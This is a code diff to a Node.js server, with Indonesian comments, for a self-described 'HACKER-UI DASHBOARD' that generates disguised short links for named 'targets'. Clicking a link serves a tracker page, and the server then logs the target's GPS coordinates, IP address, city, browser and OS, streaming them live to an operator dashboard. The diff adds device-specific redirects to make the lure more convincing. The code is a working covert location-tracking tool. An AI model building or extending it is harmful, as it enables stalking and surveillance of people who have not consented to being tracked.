@@ -1,4 +1,4 @@
-// File: server.js (v4.2 - Real-time Data on Login)
+// File: server.js (v4.3 - Device Redirects & QR)
 
 require('dotenv').config();
 
@@ -50,9 +50,6 @@ const protectRoute = (req, res, next) => {
 };
 
 // ================== HELPER FUNCTIONS & SOCKET.IO ================== //
-
-// [START] FUNGSI DIPERBARUI
-// Fungsi ini sekarang bisa mengirim ke semua orang (io.emit) atau ke satu soket spesifik (socket.emit)
 const broadcastDashboardUpdate = async (socket = null) => {
     try {
         const [links] = await db.promise().query(`
@@ -84,8 +81,6 @@ const broadcastDashboardUpdate = async (socket = null) => {
         }, {});
 
         const data = { links, stats: stats[0], browserStats };
-
-        // Tentukan target emit: satu soket spesifik atau semua koneksi
         const emitter = socket || io;
         emitter.emit('dashboard_update', data);
 
@@ -93,31 +88,23 @@ const broadcastDashboardUpdate = async (socket = null) => {
         console.error("❌ Gagal broadcast update:", error);
     }
 };
-// [END] FUNGSI DIPERBARUI
 
 const broadcastLogMessage = (message) => {
     const timestamp = new Date().toLocaleTimeString('id-ID');
     io.emit('new_log_message', `[${timestamp}] ${message}`);
 };
 
-// [START] KONEKSI SOCKET DIPERBARUI
 io.on('connection', (socket) => {
     console.log('🔌 Klien baru terhubung via WebSocket');
-
-    // Tambahkan listener untuk event permintaan data awal
     socket.on('request_initial_data', (payload) => {
         try {
             const token = payload.token;
-            if (!token) return; // Abaikan jika tidak ada token
-
-            // Verifikasi token yang dikirim oleh klien
+            if (!token) return;
             jwt.verify(token, JWT_SECRET, (err, decoded) => {
                 if (err) {
                     console.log('🔒 Token tidak valid dari klien soket.');
-                    return; // Token tidak valid, jangan kirim data
+                    return;
                 }
-                
-                // Token valid, kirim data awal HANYA ke klien ini
                 console.log(`✅ Klien terotentikasi (${decoded.username}), mengirim data awal.`);
                 broadcastDashboardUpdate(socket);
             });
@@ -125,13 +112,10 @@ io.on('connection', (socket) => {
             console.error('Error pada event request_initial_data:', error);
         }
     });
-
     socket.on('disconnect', () => {
         console.log('🔌 Klien terputus');
     });
 });
-// [END] KONEKSI SOCKET DIPERBARUI
-
 
 // ================== RUTE PUBLIK (LOGIN & HALAMAN UTAMA) ================== //
 app.get('/', (req, res) => {
@@ -139,7 +123,6 @@ app.get('/', (req, res) => {
 });
 
 app.post('/login', async (req, res) => {
-    // ... (Fungsi login tidak berubah)
     const { username, password } = req.body;
     try {
         const [users] = await db.promise().query('SELECT * FROM users WHERE username = ? AND is_admin = TRUE', [username]);
@@ -159,22 +142,41 @@ app.post('/login', async (req, res) => {
     }
 });
 
-
 // ================== RUTE LINK KLIK & LOG (TETAP PUBLIK) ================== //
 app.get('/:id', async (req, res) => {
-    // ... (Fungsi ini tidak berubah)
     const { id } = req.params;
+    const userAgentString = req.headers['user-agent'];
+    
     try {
-        const [links] = await db.promise().query(`SELECT l.original_url, l.expires_at, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
+        // Ambil semua URL dari database
+        const [links] = await db.promise().query(`SELECT l.original_url, l.url_android, l.url_ios, l.expires_at, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
+        
         if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
-        const { original_url, expires_at, username } = links[0];
+        
+        const { original_url, url_android, url_ios, expires_at, username } = links[0];
+        
         if (expires_at && new Date(expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
+        
+        // Tentukan URL tujuan berdasarkan User-Agent
+        const parser = new UAParser(userAgentString);
+        const os = parser.getOS().name;
+        
+        let destinationUrl = original_url; // Default URL
+        if (os === 'Android' && url_android) {
+            destinationUrl = url_android;
+        } else if (os === 'iOS' && url_ios) {
+            destinationUrl = url_ios;
+        }
+
+        // Tingkatkan jumlah klik
         await db.promise().query("UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", [id]);
-        broadcastLogMessage(`> Link [${id}] clicked by target [${username}]`);
+        broadcastLogMessage(`> Link [${id}] clicked by target [${username}] from an ${os || 'Unknown'} device.`);
         io.emit('link_clicked', { username: username, id: id });
+
+        // Sajikan tracker.html dengan URL tujuan yang sudah ditentukan
         fs.readFile(path.join(__dirname, 'tracker.html'), 'utf8', (fsErr, data) => {
             if (fsErr) return res.status(500).send('Server error');
-            res.send(data.replace('{{DESTINATION_URL}}', original_url).replace('{{TRACKER_ID}}', id).replace('{{USERNAME}}', username));
+            res.send(data.replace('{{DESTINATION_URL}}', destinationUrl).replace('{{TRACKER_ID}}', id).replace('{{USERNAME}}', username));
         });
     } catch (error) {
         console.error("Error handling link click:", error);
@@ -183,7 +185,6 @@ app.get('/:id', async (req, res) => {
 });
 
 app.post('/log', async (req, res) => {
-    // ... (Fungsi ini tidak berubah, tetapi pemanggilan broadcastDashboardUpdate sekarang mengirim ke semua)
     const { latitude, longitude, trackerId, username } = req.body;
     const userAgentString = req.headers['user-agent'];
     const ipAddress = req.clientIp;
@@ -221,7 +222,7 @@ app.post('/log', async (req, res) => {
         const locationInfo = city ? `from ${city}, ${country}` : '';
         broadcastLogMessage(`> Location ${locationInfo} from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
         console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}] - ${city || 'Unknown City'}, ${country || 'Unknown Country'}`);
-        broadcastDashboardUpdate(); // Panggil tanpa argumen untuk mengirim ke semua klien
+        broadcastDashboardUpdate();
         const newLocationDataForMap = { ...newLocation, username };
         io.emit('new_location_logged', newLocationDataForMap);
         res.json({ status: 'success' });
@@ -234,14 +235,16 @@ app.post('/log', async (req, res) => {
 
 // ================== API YANG DIPROTEKSI ================== //
 app.post('/create', protectRoute, async (req, res) => {
-    // ... (Fungsi ini tidak berubah)
-    const { username, originalUrl, expiresIn } = req.body;
+    const { username, originalUrl, url_android, url_ios, expiresIn } = req.body;
+    
     if (!username || !originalUrl) return res.status(400).json({ error: 'Data tidak lengkap' });
+    
     let expiresAt = null;
     if (expiresIn && !isNaN(parseInt(expiresIn))) {
         expiresAt = new Date();
         expiresAt.setHours(expiresAt.getHours() + parseInt(expiresIn));
     }
+
     try {
         let [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
         let userId;
@@ -251,8 +254,19 @@ app.post('/create', protectRoute, async (req, res) => {
             const [result] = await db.promise().query('INSERT INTO users (username) VALUES (?)', [username]);
             userId = result.insertId;
         }
+
         const id = nanoid(8);
-        await db.promise().query('INSERT INTO links SET ?', { id, user_id: userId, original_url: originalUrl, expires_at: expiresAt });
+        const newLinkData = {
+            id,
+            user_id: userId,
+            original_url: originalUrl,
+            url_android: url_android || null,
+            url_ios: url_ios || null,
+            expires_at: expiresAt
+        };
+
+        await db.promise().query('INSERT INTO links SET ?', newLinkData);
+        
         broadcastLogMessage(`> Link created for target [${username}] with ID [${id}]`);
         broadcastDashboardUpdate();
         res.status(201).json({ newLink: `http://localhost:${PORT}/${id}`, username });
@@ -263,7 +277,6 @@ app.post('/create', protectRoute, async (req, res) => {
 });
 
 app.delete('/api/links/:id', protectRoute, async (req, res) => {
-    // ... (Fungsi ini tidak berubah)
     const { id } = req.params;
     try {
         await db.promise().query("DELETE FROM links WHERE id = ?", [id]);
@@ -276,7 +289,6 @@ app.delete('/api/links/:id', protectRoute, async (req, res) => {
 });
 
 app.get('/api/locations', protectRoute, async (req, res) => {
-    // ... (Fungsi ini tidak berubah)
     try {
         const [rows] = await db.promise().query(`
             SELECT l.*, u.username
@@ -291,7 +303,6 @@ app.get('/api/locations', protectRoute, async (req, res) => {
 });
 
 app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
-    // ... (Fungsi ini tidak berubah)
     const { trackerId } = req.params;
     try {
         const [locations] = await db.promise().query(`
@@ -310,7 +321,7 @@ app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
 
 // ================== RUN SERVER ================== //
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v4.2 (Real-time on Login)`);
+    console.log(`\n HACKER-UI DASHBOARD v4.3 (Device Redirects & QR)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
